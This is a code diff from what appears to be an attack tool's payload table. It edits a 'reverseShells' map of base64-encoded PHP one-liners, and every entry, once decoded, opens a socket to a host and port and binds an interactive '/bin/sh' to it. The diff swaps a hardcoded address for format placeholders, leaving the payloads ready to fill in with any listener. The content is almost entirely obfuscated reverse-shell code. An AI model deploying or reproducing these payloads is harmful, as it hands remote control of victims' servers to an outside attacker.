@@ -136,11 +136,11 @@ reverseShells = {
 
   "PHP": [
     "cGhwIC1yICckc29jaz1mc29ja29wZW4oInswfSIsezF9KTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc=",
-    "cGhwIC1yICckcz1mc29ja29wZW4oIjEwLjAuMC4xIix7MX0pO3NoZWxsX2V4ZWMoIi9iaW4vc2ggLWkgPCYzID4mMyAyPiYzIik7Jw==",
-    "cGhwIC1yICckcz1mc29ja29wZW4oIjEwLjAuMC4xIix7MX0pO2AvYmluL3NoIC1pIDwmMyA+JjMgMj4mM2A7Jw==",
-    "cGhwIC1yICckcz1mc29ja29wZW4oIjEwLjAuMC4xIix7MX0pO3N5c3RlbSgiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsn",
+    "cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtzaGVsbF9leGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc=",
+    "cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtgL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjNgOyc=",
+    "cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtzeXN0ZW0oIi9iaW4vc2ggLWkgPCYzID4mMyAyPiYzIik7Jw==",
     "cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtwb3BlbigiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiLCAiciIpOyc=",
-    "cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjAuMC4xIix7MX0pOyAkcHJvYyA9IHByb2Nfb3BlbigiL2Jpbi9zaCAtaSIsIGFycmF5KDA9PiRzb2NrLCAxPT4kc29jaywgMj0+JHNvY2spLCAkcGlwZXMpOyc=",
+    "cGhwIC1yICckc29jaz1mc29ja29wZW4oInswfSIsezF9KTsgJHByb2MgPSBwcm9jX29wZW4oIi9iaW4vc2ggLWkiLCBhcnJheSgwPT4kc29jaywgMT0+JHNvY2ssIDI9PiRzb2NrKSwgJHBpcGVzKTsn",
   ],
 
   "Node.js": [
